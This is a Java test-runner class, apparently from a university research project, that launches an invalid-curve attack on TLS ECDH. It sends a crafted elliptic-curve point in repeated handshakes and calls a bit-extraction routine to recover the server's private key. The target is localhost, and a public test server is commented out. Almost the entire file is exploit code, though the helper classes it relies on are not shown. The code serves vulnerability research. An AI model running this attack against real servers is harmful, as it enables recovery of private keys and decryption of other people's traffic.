/*
 * 
 */
package de.rub.nds.ecdhattack;

import de.rub.nds.ecdhattack.utilities.NastyPoint;
import de.rub.nds.ecdhattack.utilities.TLSConnector;
import de.rub.nds.ssl.stack.ECUtility;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.EECPointFormat;
import java.io.IOException;
import java.math.BigInteger;
import java.net.SocketException;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class TestRunner {

//    private static final String HOST = "www.mitls.org";
//    private static final int PORT = 2443;
    private static final String HOST = "localhost";
    private static final int PORT = 55443;
//    private static final String X = "82014859963010894574757305244210625734697257313587897329404982989788567941499";
//    private static final String Y = "1908267400714237267241946255076265219399988738601471281109513294166199342120";
    private static final String testX = "4413728777894370688626360238221457152142207171897515973391901566419629642337";
    private static final String testY = "8";
    private static final String[] xPossibilities = {"4413728777894370688626360238221457152142207171897515973391901566419629642337", "94703433087219769958968507554995420456313928579967529911801204931664580051025", "16763546533236136729776858374873986184508446472577652454685525572272768976203"};

    public void launchAttack() throws SocketException, InterruptedException {
        TLSConnector tlsConnector = new TLSConnector(HOST, PORT);
        byte[] encodedNastyPoint;

        NastyPoint point = new NastyPoint();
        point.x = new BigInteger(testX);
        point.y = new BigInteger(testY);
        encodedNastyPoint = ECUtility.encodeX9_62(point.x.toByteArray(),
                point.y.toByteArray(), EECPointFormat.UNCOMPRESSED);

        // start the handshake
        for (String possibility : xPossibilities) {
            for (int i = 0; i < 4; i++) {
                BigInteger x = new BigInteger(possibility);
                tlsConnector.launchBitExtraction(encodedNastyPoint, x.toByteArray());
            }
        }
    }

    /**
     * @param args the command line arguments
     * @throws FileNotFoundException
     * @throws IOException
     * @throws InterruptedException
     */
    public static void main(final String[] args) throws
            SocketException, InterruptedException {
        new TestRunner().launchAttack();
    }
}
